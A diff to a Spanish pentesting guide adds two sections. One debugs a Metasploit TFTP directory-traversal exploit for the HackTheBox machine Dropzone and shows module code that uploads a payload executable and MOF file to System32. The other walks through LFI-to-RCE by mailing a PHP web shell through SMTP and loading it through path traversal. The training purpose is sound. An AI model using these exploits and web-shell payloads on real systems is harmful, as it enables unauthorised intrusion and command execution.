@@ -1612,6 +1612,355 @@ require 'pry-byebug' # Nueva línea a insertar, las demás están por defecto.
 if ENV['METASPLOIT_FRAMEWORK_PROFILE'] == 'true'
 ```
 
+Para poner un caso práctico, vamos a ponerlo en práctica con la máquina **Dropzone** de HackTheBox. Esta máquina se puede comprometer a través de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.
+
+El servicio a atacar es el **TFTP**, y el módulo es el **exploit/windows/tftp/distinct_tftp_traversal**. Este exploit, cuenta con las siguientes configuraciones:
+
+```bash
+Module options (exploit/windows/tftp/distinct_tftp_traversal):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   DEPTH  10               no        Levels to reach base directory
+   RHOST                   yes       The remote TFTP server address
+   RPORT  69               yes       The remote TFTP server port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Distinct TFTP 3.10 on Windows
+```
+
+En este caso, podemos aplicar un **LFI** sobre el servicio, siendo la variable **DEPTH** la correspondiente al número de veces que queremos retroceder hasta llegar a la ruta raíz. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.
+
+¿Cómo podríamos haber sabido esto sin mirar el código?, **pry-byebug** será la respuesta a nuestros problemas.
+
+Lo que haremos será generar una instancia del módulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #searchsploit -m exploits/windows/webapps/41714.rb
+  Exploit: Distinct TFTP 3.10 - Writable Directory Traversal Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/41714/
+     Path: /usr/share/exploitdb/exploits/windows/webapps/41714.rb
+File Type: Ruby script, ASCII text, with CRLF line terminators
+
+Copied to: /home/s4vitar/Desktop/41714.rb
+
+
+┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb
+```
+
+Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razón. Una vez hecho, dado que hemos importado la utilidad **pry-byebug** en la nueva instancia de **msfconsole**, lo que nos queda es establecer un **BreakPoint** sobre el módulo que queremos Debuggear. 
+
+Para ello, abrimos la instancia del módulo, y añadimos la siguiente línea (lo haré en la siguiente porción de código):
+
+```bash
+  def exploit
+    peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+
+    # Setup the necessary files to do the wbemexec trick
+    binding.pry # <-------------------------------- Nueva línea que hemos añadido
+    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+```
+
+¿Qué consguimos con esto?, vamos a comprobarlo. Correremos el **msfconsole** desde la ruta **/opt/metasploit-framework/msfconsole**, posteriormente seleccionaremos el nuevo módulo clonado, setearemos el **DEPTH** a 0, configuramos el resto de variables y le daremos a **run**:
+
+```bash
+┌─[✗]─[root@parrot]─[/opt/metasploit-framework]
+└──╼ #/opt/metasploit-framework/msfconsole -q
+[*] Starting persistent handler(s)...
+msf > use exploit/windows/tftp/exploit_tftp 
+msf exploit(windows/tftp/exploit_tftp) > show options
+
+Module options (exploit/windows/tftp/exploit_tftp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   DEPTH  10               no        Levels to reach base directory
+   RHOST                   yes       The remote TFTP server address
+   RPORT  69               yes       The remote TFTP server port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Distinct TFTP 3.10 on Windows
+
+
+msf exploit(windows/tftp/exploit_tftp) > set DEPTH 0
+DEPTH => 0
+msf exploit(windows/tftp/exploit_tftp) > set RHOST 192.168.1.12
+RHOST => 192.168.1.12
+msf exploit(windows/tftp/exploit_tftp) > run
+```
+
+Una vez hecho, obtendremos los siguientes resultados:
+
+```bash
+msf exploit(windows/tftp/exploit_tftp) > run
+
+[*] Started reverse TCP handler on 192.168.1.51:4444 
+Found plugin pry-byebug, but could not require 'pry-byebug'
+cannot load such file -- pry-byebug
+
+From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:
+
+     81: def exploit
+     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+     83: 
+     84:   # Setup the necessary files to do the wbemexec trick
+     85:   binding.pry
+ =>  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+     87:   exe      = generate_payload_exe
+     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
+     89:   mof      = generate_mof(mof_name, exe_name)
+     90: 
+     91:   # Configure how deep we want to traverse
+     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+     93:   levels = "../" * depth
+     94: 
+     95:   # Upload the malicious executable to C:\Windows\System32\
+     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+     98: 
+     99:   # Let the TFTP server idle a bit before sending another file
+    100:   select(nil, nil, nil, 1)
+    101: 
+    102:   # Upload the mof file
+    103:   print_status("#{peer} - Uploading .mof...")
+    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
+    105: end
+
+[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
+```
+
+En este preciso instante, nos situaríamos en la línea 86 del código del programa, manteniendo el mismo en estado de pausa (esto es así debido a que es en la línea superior donde hemos fijado el Breakpoint).
+
+Llegados a este punto, si nos fijamos, en esa misma línea se va a almacenar un valor para la variable exe_name, ¿podríamos ver el valor que se almacena en dicha variable?, la respuesta es sí... para ello necesitamos avanzar una instrucción en la línea del programa para posteriormente ver su contenido. Lo haríamos de la siguiente forma:
+
+```bash
+[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> n
+
+From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 87 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:
+
+     81: def exploit
+     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+     83: 
+     84:   # Setup the necessary files to do the wbemexec trick
+     85:   binding.pry
+     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+ =>  87:   exe      = generate_payload_exe
+     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
+     89:   mof      = generate_mof(mof_name, exe_name)
+     90: 
+     91:   # Configure how deep we want to traverse
+     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+     93:   levels = "../" * depth
+     94: 
+     95:   # Upload the malicious executable to C:\Windows\System32\
+     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+     98: 
+     99:   # Let the TFTP server idle a bit before sending another file
+    100:   select(nil, nil, nil, 1)
+    101: 
+    102:   # Upload the mof file
+    103:   print_status("#{peer} - Uploading .mof...")
+    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
+    105: end
+
+[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> exe_name
+=> "xMDsIBr.exe"
+[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
+```
+
+Donde como vemos, el valor que está almacenando dicha variable es **xMDsIBr.exe**. De igual manera, podríamos ver como las variables **depth** y **levels** no toman el valor que deberían. Para ello, podremos establecer un Breakpoint en la línea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.
+
+Aplicamos los siguientes comandos:
+
+```bash
+[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> break 96
+
+  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 
+
+      93:     levels = "../" * depth
+    94: 
+    95:     # Upload the malicious executable to C:\Windows\System32\
+ => 96:     print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+    97:     upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+    98: 
+    99:     # Let the TFTP server idle a bit before sending another file
+
+
+[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> c
+
+  Breakpoint 1. First hit
+
+From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:
+
+     81: def exploit
+     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+     83: 
+     84:   # Setup the necessary files to do the wbemexec trick
+     85:   binding.pry
+     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+     87:   exe      = generate_payload_exe
+     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
+     89:   mof      = generate_mof(mof_name, exe_name)
+     90: 
+     91:   # Configure how deep we want to traverse
+     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+     93:   levels = "../" * depth
+     94: 
+     95:   # Upload the malicious executable to C:\Windows\System32\
+ =>  96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+     98: 
+     99:   # Let the TFTP server idle a bit before sending another file
+    100:   select(nil, nil, nil, 1)
+    101: 
+    102:   # Upload the mof file
+    103:   print_status("#{peer} - Uploading .mof...")
+    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
+    105: end
+
+[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> depth
+=> 10
+[4] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> levels
+=> "../../../../../../../../../../"
+[5] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
+```
+
+Como vemos, el valor de la variable **levels** es (**../../../../../../../../../../**), lo que hace que nos planteemos que no se está almacenando correctamente el valor de nuestro **DEPTH**. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente línea del programa:
+
+```bash
+92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+```
+
+Donde como vemos, se especifica claramente que en caso de que el valor de **DEPTH** valga 0, esta se igualará a 10. Por lo que, deberíamos cambiar la declaración a lo siguiente:
+
+```bash
+92:   depth  = datastore['DEPTH']
+```
+
+Una vez hecho, podremos ver como los valores de **DEPTH** y de **levels** son declarados correctamente:
+
+```bash
+msf exploit(windows/tftp/exploit_tftp) > show options
+
+Module options (exploit/windows/tftp/exploit_tftp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   DEPTH  10               no        Levels to reach base directory
+   RHOST                   yes       The remote TFTP server address
+   RPORT  69               yes       The remote TFTP server port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Distinct TFTP 3.10 on Windows
+
+
+msf exploit(windows/tftp/exploit_tftp) > set DEPTH 0
+DEPTH => 0
+msf exploit(windows/tftp/exploit_tftp) > set RHOST 192.168.1.42
+RHOST => 192.168.1.42
+msf exploit(windows/tftp/exploit_tftp) > run
+
+[*] Started reverse TCP handler on 192.168.1.51:4444 
+Found plugin pry-byebug, but could not require 'pry-byebug'
+cannot load such file -- pry-byebug
+
+From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:
+
+     81: def exploit
+     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+     83: 
+     84:   # Setup the necessary files to do the wbemexec trick
+     85:   binding.pry
+ =>  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+     87:   exe      = generate_payload_exe
+     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
+     89:   mof      = generate_mof(mof_name, exe_name)
+     90: 
+     91:   # Configure how deep we want to traverse
+     92:   depth  = datastore['DEPTH']
+     93:   levels = "../" * depth
+     94: 
+     95:   # Upload the malicious executable to C:\Windows\System32\
+     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+     98: 
+     99:   # Let the TFTP server idle a bit before sending another file
+    100:   select(nil, nil, nil, 1)
+    101: 
+    102:   # Upload the mof file
+    103:   print_status("#{peer} - Uploading .mof...")
+    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
+    105: end
+
+[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> break 96
+
+  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 
+
+      93:     levels = "../" * depth
+    94: 
+    95:     # Upload the malicious executable to C:\Windows\System32\
+ => 96:     print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+    97:     upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+    98: 
+    99:     # Let the TFTP server idle a bit before sending another file
+
+
+[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> c
+
+  Breakpoint 1. First hit
+
+From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:
+
+     81: def exploit
+     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+     83: 
+     84:   # Setup the necessary files to do the wbemexec trick
+     85:   binding.pry
+     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
+     87:   exe      = generate_payload_exe
+     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
+     89:   mof      = generate_mof(mof_name, exe_name)
+     90: 
+     91:   # Configure how deep we want to traverse
+     92:   depth  = datastore['DEPTH']
+     93:   levels = "../" * depth
+     94: 
+     95:   # Upload the malicious executable to C:\Windows\System32\
+ =>  96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
+     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
+     98: 
+     99:   # Let the TFTP server idle a bit before sending another file
+    100:   select(nil, nil, nil, 1)
+    101: 
+    102:   # Upload the mof file
+    103:   print_status("#{peer} - Uploading .mof...")
+    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
+    105: end
+
+[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> depth
+=> 0
+[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> levels
+=> ""
+[4] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> 
+```
+
+Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya queda claro la funcionalidad del **pry-byebug**.
+
 **2. Burpsuite**
 
 ### Pentesting Web
@@ -1768,7 +2117,7 @@ De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para 
 Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:
 
 * Log Poisoning (access.log & auth.log)
-* Mail PHP Execution FIXME: Redactar este punto
+* Mail PHP Execution
 
 La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.
 
@@ -1794,6 +2143,51 @@ Para el caso del recurso _access.log_ pasa algo similar, sólo que en cuanto a l
 Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso _auth.log_.
 
 Otra de las técnicas para conseguir la ejecución de comandos a través de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodología paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).
+
+La segunda de ellas [**Mail PHP Execution**], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '**/etc/passwd**', poder visualizar sus correspondientes mails en '**/var/mail/usuario**'.
+
+Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos "malformar" un mensaje para insertar código PHP y posteriormente apuntarlo desde el navegador.
+
+En caso de no llegar a saber qué usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:
+
+```bash
+smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X 
+```
+
+Obteniendo resultados similares al siguiente:
+
+```bash
+192.168.1.X: root exists
+192.168.1.X: mysql exists
+192.168.1.X: www-data exists
+```
+
+Ahora que sabemos que el usuario **www-data** existe, podemos hacer lo siguiente:
+
+```bash
+telnet 192.168.1.X 25
+
+HELO localhost
+
+MAIL FROM:<root>
+
+RCPT TO:<www-data>
+
+DATA
+
+<?php
+
+echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+¿Qué tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sólo tendremos que hacer lo siguiente:
+
+```bash
+http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar
+```
+
+Y el navegador nos devolverá el output del comando aplicado a nivel de sistema.
 
 #### LFI to RCE via PHP Sessions
 
